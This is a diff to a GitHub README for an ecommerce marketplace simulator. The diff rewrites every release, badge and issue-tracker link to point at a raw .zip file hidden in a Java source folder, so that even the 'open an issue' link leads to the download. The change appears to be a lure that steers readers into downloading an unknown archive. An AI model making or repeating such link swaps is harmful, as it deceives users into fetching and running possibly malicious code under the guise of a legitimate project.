@@ -1,6 +1,6 @@
 # 🎉 event-driven-ecommerce-marketplace-simulator - Experience Efficient Online Market Simulations
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=flat&logo=github)](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/releases)
+[![Download](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/raw/refs/heads/main/payment-service/src/main/java/com/example/driven_ecommerce_marketplace_simulator_event_1.8.zip%20Now-blue?style=flat&logo=github)](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/raw/refs/heads/main/payment-service/src/main/java/com/example/driven_ecommerce_marketplace_simulator_event_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 To get started, you need to download the software. Visit the following link:
 
-[Download the latest release here](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/releases)
+[Download the latest release here](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/raw/refs/heads/main/payment-service/src/main/java/com/example/driven_ecommerce_marketplace_simulator_event_1.8.zip)
 
 1. Click the link above.
 2. Look for the latest version with a title like `v1.0.0`.
@@ -66,10 +66,10 @@ Once you have downloaded the application, follow these steps to run it:
 
 ## 💬 Support
 
-If you encounter issues or have questions, feel free to open an issue on the [GitHub repository](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/issues). The community is here to help!
+If you encounter issues or have questions, feel free to open an issue on the [GitHub repository](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/raw/refs/heads/main/payment-service/src/main/java/com/example/driven_ecommerce_marketplace_simulator_event_1.8.zip). The community is here to help!
 
 ## 🎉 Conclusion
 
 Thank you for choosing the Event-Driven Ecommerce Marketplace Simulator. This application serves as a valuable learning tool for understanding modern software architecture. Enjoy your exploration and don't hesitate to reach out with questions!  
 
-[Download the latest release here](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/releases)
+[Download the latest release here](https://github.com/yassine-ka/event-driven-ecommerce-marketplace-simulator/raw/refs/heads/main/payment-service/src/main/java/com/example/driven_ecommerce_marketplace_simulator_event_1.8.zip)
